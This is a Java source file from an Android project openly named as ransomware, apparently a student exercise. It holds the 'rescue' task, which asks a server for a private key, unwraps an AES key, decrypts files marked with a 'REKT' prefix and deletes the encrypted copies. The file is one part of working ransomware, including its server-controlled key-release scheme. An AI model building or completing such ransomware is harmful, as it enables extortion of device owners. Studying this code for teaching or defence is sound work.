package fr.esgi.ransomware.task;

import android.content.Context;
import android.os.Handler;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.PrivateKey;
import java.security.spec.AlgorithmParameterSpec;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import fr.esgi.ransomware.ApiService;
import fr.esgi.ransomware.Util;
import fr.esgi.ransomware.file_reader.FileFinderRescue;
import retrofit2.Call;
import retrofit2.Response;

public class RescueTask extends Task {

    public RescueTask(Context context, Handler handler) {
        super(context, handler);
    }

    @Override
    public void run() throws Exception {
        Call<ApiService.RescueResponse> call = Util.newRetrofitService().rescue(Util.loadUUID(context));
        Response<ApiService.RescueResponse> response = call.execute();
        if (!response.isSuccessful()) {
            throw new RuntimeException("Failed to register (" + response.code() + " : " + response.errorBody().toString() + ")");
        }

        Util.sendLogMessage(handler, "Registered to API");
        ApiService.RescueResponse result = response.body();

        PrivateKey privateKey = Util.loadPrivateKey(result.getPrivateKey());
        Util.sendLogMessage(handler, "Private key loaded");

        byte[] aesKey = Util.loadAesKey(privateKey, context);
        Util.sendLogMessage(handler, "AES Key Loaded");

        Cipher aesCipher = Cipher.getInstance(Util.AES_ALG);
        AlgorithmParameterSpec spec = new IvParameterSpec(Util.IV.getBytes());
        aesCipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(aesKey, "AES"), spec);

        File inputFile = new File(Util.PATH_TO_REKT);
        List<File> foundFiles = new FileFinderRescue().findFiles(inputFile);
        Util.sendLogMessage(handler, "Found " + foundFiles.size() + " files to rescue");
        for (File file : foundFiles) {
            File cleanFile = null;
            try {
                cleanFile = rescueFile(file, aesCipher);
                Util.sendLogMessage(handler, file.getAbsolutePath());
                file.delete();
            } catch (Exception e) {
                if (cleanFile != null)
                    cleanFile.delete();
                e.printStackTrace();
            }
        }

        Util.sendLogMessage(handler, "----------------------------------------------------");
        Util.sendLogMessage(handler, "                         END");
        Util.sendLogMessage(handler, "----------------------------------------------------");

        Util.cleanAesKey(context);
    }

    private File rescueFile(File file, Cipher aesCipher) throws Exception {
        File outputFile = new File(file.getParent() + "/" + file.getName().replace(Util.PREFIX_FILE_REKT, ""));
        CipherInputStream inputStream = null;
        FileOutputStream outputStream = null;
        try {
            inputStream = new CipherInputStream(new FileInputStream(file), aesCipher);

            outputStream = new FileOutputStream(outputFile);

            Util.copyStream(inputStream, outputStream);
        } finally {
            if (inputStream != null) inputStream.close();
            if (outputStream != null) outputStream.close();
        }

        return outputFile;
    }
}
